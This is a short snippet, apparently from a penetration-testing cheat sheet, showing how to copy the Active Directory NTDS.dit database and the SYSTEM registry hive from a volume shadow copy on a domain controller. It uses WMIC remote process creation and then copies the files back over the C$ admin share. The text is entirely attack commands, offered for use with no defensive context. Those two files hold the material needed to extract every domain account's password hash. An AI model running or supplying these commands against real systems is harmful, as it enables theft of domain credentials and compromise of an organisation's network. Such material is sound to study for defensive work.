
### Using WMIC.exe copy the NTDS database remotely


```powershell
wmic /node:SECDC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit 2>&1 > C:\temp\output.txt" 
wmic /node:SECDC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM.hive 2>&1 > C:\temp\output.txt" 
copy /Y \\SECDC01\C$\temp\NTDS.dit C:\temp\NTDS.dit 
copy \\SECDC01\C$\temp\SYSTEM.hive C:\temp\SYSTEM.hive
```
